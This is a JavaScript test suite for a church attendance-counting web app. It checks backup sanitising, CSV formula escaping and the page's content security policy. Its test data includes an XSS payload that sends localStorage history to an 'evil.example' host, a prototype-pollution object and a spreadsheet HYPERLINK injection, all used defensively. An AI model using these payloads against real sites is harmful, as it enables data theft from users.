// Hardening against hostile input: crafted backups, spreadsheet formulas,
// and the page's content security policy.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { sanitizeBackup, sanitizeRecord, sanitizeNames, cleanText, cleanCount, cleanDate, LIMITS } from '../src/sanitize.js';
import { csvCell, escapeHtml } from '../src/utils.js';
import { mergeBackups } from '../src/cloud.js';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = p => readFileSync(join(root, p), 'utf8');
const backup = (history, extra = {}) => ({ version: '1.0', app: 'MTC Counter', data: { mtcHistory: history, ...extra } });
const good = { date: '2026-11-10', service: 'Morning', parishName: 'St. Thomas', celebrant: 'Rev. A', coCelebrants: '',
  sermon: 'S', scripture: 'John 3:16', male: 86, female: 107, total: 193, rounds: [], timestamp: '2026-11-10T10:00:00.000Z' };

test('a normal backup comes through unchanged', () => {
  const clean = sanitizeBackup(backup([good], { savedCelebrants: ['Rev. A'], savedParishes: ['St. Thomas'] }));
  assert.deepEqual(clean.history, [good]);
  assert.deepEqual(clean.celebrants, ['Rev. A']);
  assert.deepEqual(clean.parishes, ['St. Thomas']);
  assert.equal(clean.rejected, 0);
});

test('files that are not MTC Counter backups are refused', () => {
  for (const bad of [null, 'text', 42, [], {}, { app: 'Other', data: {} }, { app: 'MTC Counter' },
    { app: 'MTC Counter', data: [] }, { app: 'MTC Counter', data: 'x' }]) {
    assert.equal(sanitizeBackup(bad), null, JSON.stringify(bad));
  }
});

test('records are rebuilt from known fields; anything else is dropped', () => {
  const r = sanitizeRecord({ ...good, __proto__: { polluted: true }, constructor: 'x', onclick: 'alert(1)',
    extra: { deep: [1, 2, 3] }, notes: 'from the iPhone app' });
  assert.deepEqual(Object.keys(r).sort(),
    ['celebrant', 'coCelebrants', 'date', 'female', 'male', 'notes', 'parishName', 'rounds', 'scripture', 'sermon', 'service', 'timestamp', 'total']);
  assert.equal(r.notes, 'from the iPhone app');
  assert.equal({}.polluted, undefined); // nothing leaked onto every object
});

test('wrong types and absurd values are neutralised', () => {
  const r = sanitizeRecord({
    date: '2026-11-10', service: { toString: () => '<img src=x onerror=alert(1)>' }, parishName: ['a', 'b'],
    celebrant: 12345, sermon: 'x'.repeat(5000), scripture: null, coCelebrants: true,
    male: '86', female: -5, total: 1e308, rounds: 'not a list', timestamp: 'yesterday-ish',
  });
  assert.equal(r.service, '');                 // objects are not text
  assert.equal(r.parishName, '');
  assert.equal(r.celebrant, '12345');          // numbers become text
  assert.equal(r.sermon.length, 200);          // capped
  assert.equal(r.scripture, '');
  assert.equal(r.coCelebrants, '');
  assert.deepEqual([r.male, r.female, r.total], [86, 0, 86]); // total is recalculated
  assert.deepEqual(r.rounds, []);
  assert.equal(r.timestamp, '');
  assert.equal(cleanCount(1e308), LIMITS.count);
  assert.equal(cleanCount(NaN), 0);
  assert.equal(cleanCount('12.9'), 12);
  assert.equal(cleanText('a\u0000b\u0007c\u001Bd', 50), 'abcd'); // control characters removed
  assert.equal(cleanText('  two\nlines\t ok ', 50), 'two\nlines\t ok');
});

test('only real calendar dates are accepted', () => {
  assert.equal(cleanDate('2026-11-10'), '2026-11-10');
  assert.equal(cleanDate('2028-02-29'), '2028-02-29'); // leap day
  for (const bad of ['2026-02-30', '2026-13-01', '10/11/2026', '2026-11-10T00:00', '', null, 20261110, {}, '2026-11-10<script>']) {
    assert.equal(cleanDate(bad), null, String(bad));
  }
  for (const bad of [null, 'x', [], { date: 123 }, { date: '' }, { ...good, date: '2026-02-31' }]) {
    assert.equal(sanitizeRecord(bad), null);
  }
});

test('markup in a restored backup stays text all the way to the page', () => {
  const evil = '"><img src=x onerror="fetch(\'https://evil.example/\'+localStorage.mtcHistory)">';
  const r = sanitizeBackup(backup([{ ...good, parishName: evil, service: '<script>alert(1)</script>' }])).history[0];
  assert.equal(r.parishName, evil.slice(0, 120));        // kept as the text it is
  const shown = escapeHtml(r.parishName) + escapeHtml(r.service);
  assert.ok(!/[<>"']/.test(shown), shown);                // and never becomes markup when shown
});

test('offertory in a backup: totals are recalculated, unknown keys dropped', () => {
  const r = sanitizeRecord({ ...good, offertory: {
    currency: 'KWD', total: 9e9, totalMinor: 9e12, venue: '<b>Hall</b>', hacked: true,
    counts: { offertory: { '20': 2, '0.500': '3', '7': 99, '10': -4 }, bogus: { '20': 5 } },
    signatures: [{ name: 'A', color: 'red;background:url(x)', strokes: [[1, 2, 99999, -5], 'x'] }],
  } });
  assert.deepEqual(r.offertory.counts.offertory, { '20': 2, '0.500': 3 });
  assert.equal(r.offertory.totalMinor, 41500);
  assert.equal(r.offertory.total, 41.5);
  assert.equal(r.offertory.hacked, undefined);
  assert.equal(r.offertory.venue, '<b>Hall</b>');            // text is kept; escaping happens on display
  assert.deepEqual(r.offertory.signatures[0], { name: 'A', strokes: [[1, 2, 1000, 0]], color: 'black' });
  // An offertory with nothing counted is left off the record.
  assert.equal(sanitizeRecord({ ...good, offertory: { currency: 'KWD', counts: {} } }).offertory, undefined);
  assert.equal(sanitizeRecord({ ...good, offertory: 'junk' }).offertory, undefined);
});

test('size limits: huge lists are cut, duplicates collapse', () => {
  const many = Array.from({ length: LIMITS.records + 50 }, (_, i) => ({ ...good, service: 'S' + i }));
  assert.equal(sanitizeBackup(backup(many)).history.length, LIMITS.records);
  assert.equal(sanitizeNames(Array.from({ length: 2000 }, (_, i) => 'Name ' + i)).length, LIMITS.names);
  assert.deepEqual(sanitizeNames(['A', ' A ', '', null, 5, { x: 1 }, 'B', 'A']), ['A', '5', 'B']);
  assert.deepEqual(sanitizeNames('not a list'), []);
  const rounds = Array.from({ length: 900 }, () => ({ male: 1, female: 1 }));
  assert.equal(sanitizeRecord({ ...good, rounds }).rounds.length, LIMITS.rounds);
  // Same date + service twice: one record.
  assert.equal(sanitizeBackup(backup([good, { ...good, male: 1 }, { ...good, service: 'MORNING ' }])).history.length, 1);
});

test('a backup with only unusable records is flagged, so it cannot wipe real data', () => {
  const clean = sanitizeBackup(backup([{ date: 'x' }, null, 'junk']));
  assert.equal(clean.history.length, 0);
  assert.equal(clean.rejected, 3);
  assert.ok(clean.hasHistory);
  // A backup that simply has no history section is different from one full of junk.
  assert.equal(sanitizeBackup({ app: 'MTC Counter', data: { savedParishes: ['A'] } }).hasHistory, false);
});

test('a sanitised Drive backup merges safely with local records', () => {
  const remote = sanitizeBackup(backup([{ ...good, male: 90, timestamp: '2026-11-11T10:00:00Z' }, { date: 99 }, { ...good, date: '2026-11-17', service: '' }],
    { savedCelebrants: ['Rev. A', { evil: 1 }, 'Rev. B'] }));
  const merged = mergeBackups({ history: [good], celebrants: ['Rev. A'], parishes: [] }, remote);
  assert.equal(merged.history.length, 2);
  assert.equal(merged.history.find(r => r.date === '2026-11-10').male, 90); // the newer one wins
  assert.deepEqual(merged.celebrants, ['Rev. A', 'Rev. B']);
});

test('CSV cells cannot run as spreadsheet formulas', () => {
  assert.equal(csvCell('St. Thomas'), '"St. Thomas"');
  assert.equal(csvCell('He said "hi"'), '"He said ""hi"""');
  assert.equal(csvCell('=HYPERLINK("http://evil.example","x")'), '"\'=HYPERLINK(""http://evil.example"",""x"")"');
  for (const start of ['=', '+', '-', '@', '\t', '\r']) assert.ok(csvCell(start + 'cmd').startsWith('"\''), JSON.stringify(start));
  assert.equal(csvCell('a=b'), '"a=b"');   // only the first character matters
  assert.equal(csvCell(null), '""');
  assert.equal(csvCell(42), '"42"');
});

test('index.html has a content security policy and no inline scripts', () => {
  const html = read('index.html');
  const csp = (html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1];
  assert.ok(csp, 'policy missing');
  const dir = name => (csp.split(';').map(s => s.trim()).find(d => d.startsWith(name + ' ')) || '').slice(name.length + 1);
  assert.equal(dir('default-src'), "'self'");
  assert.equal(dir('object-src'), "'none'");
  assert.equal(dir('base-uri'), "'self'");
  assert.equal(dir('form-action'), "'none'");
  // Script files: this site and Google sign-in only; no inline blocks, no eval.
  assert.equal(dir('script-src-elem'), "'self' https://accounts.google.com");
  assert.ok(!/'unsafe-eval'/.test(csp), 'eval must stay blocked');           // ('wasm-unsafe-eval' is WebAssembly only)
  assert.ok(!/script-src-elem[^;]*unsafe-inline/.test(csp));
  // Data may only be sent to this site and the Google services the app uses.
  assert.deepEqual(dir('connect-src').split(' ').sort(), ["'self'", 'https://accounts.google.com',
    'https://oauth2.googleapis.com', 'https://storage.googleapis.com', 'https://www.googleapis.com']);
  assert.ok(!/(^|[\s;])(\*|https?:)(\s|;|$)/.test(csp), 'no wildcard sources');
  // Every <script> is a file from this site.
  const scripts = [...html.matchAll(/<script\b([^>]*)>/g)].map(m => m[1]);
  assert.ok(scripts.length >= 2);
  for (const attrs of scripts) assert.match(attrs, /\bsrc="\.\/src\/[\w-]+\.js"/, 'inline or foreign script: <script' + attrs + '>');
  assert.ok(html.includes('<meta name="referrer" content="no-referrer">'));
});

test('links that open another site get no handle back to the app', () => {
  for (const f of ['src/export.js', 'src/stats.js']) {
    const opens = [...read(f).matchAll(/window\.open\(([^;]*)\);/g)].map(m => m[1]);
    assert.ok(opens.length >= 1, f);
    for (const o of opens) assert.ok(o.includes("'noopener,noreferrer'"), f + ': ' + o);
  }
});
